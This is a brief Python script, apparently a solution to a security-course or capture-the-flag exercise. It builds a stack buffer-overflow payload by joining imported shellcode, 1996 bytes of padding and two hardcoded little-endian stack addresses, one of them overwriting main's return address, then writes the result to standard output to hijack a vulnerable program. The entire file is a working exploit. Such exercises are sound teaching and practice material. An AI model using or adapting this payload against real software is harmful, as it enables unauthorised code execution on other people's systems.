import sys
from shellcode import shellcode

addr = 0xfff6b198.to_bytes(4, "little") #adress for p
ret_addr= 0xfff6b9a4.to_bytes(4,"little") #main return adress
sys.stdout.buffer.write(shellcode + b"A" * 1996 + addr+ ret_addr)